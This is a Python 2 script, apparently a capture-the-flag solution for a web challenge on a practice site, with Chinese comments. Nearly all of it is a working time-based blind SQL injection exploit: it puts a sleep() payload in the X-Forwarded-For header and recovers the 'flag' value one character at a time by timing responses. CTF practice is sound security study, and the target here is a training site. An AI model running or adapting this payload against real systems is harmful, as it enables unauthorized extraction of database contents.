#! /usr/bin/env python
# -*- coding=utf-8 -*-
import urllib2
import time
import requests
#要访问的地址
url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
#枚举的可能字符
const_str="abcdefghijklmnopqrstuvwxyz0123456789@_.{}-"
#最终的字符串
flag_str=""
for i in range(1,33):
    isflag = False
    for j in range(0,len(const_str)):
        sql="' or sleep(((select substring(flag from "+str(i)+" for 1) from flag)='"+const_str[j]+"')*5) and '1'='1"
        headers={
            "X-forwarded-for":sql
        }
        #print sql
        last = time.time()
        requests.get(url, headers=headers,timeout=10)
        now = time.time()
        if now - last > 5:#此处的时间和sql变量中的延时参数可以根据实际情况进行修改
            flag_str += const_str[j]
            isflag = True
            print i,flag_str
            break
    if not isflag :#如果该位没有枚举出结果则报错
        print 'error'
        break
print flag_str


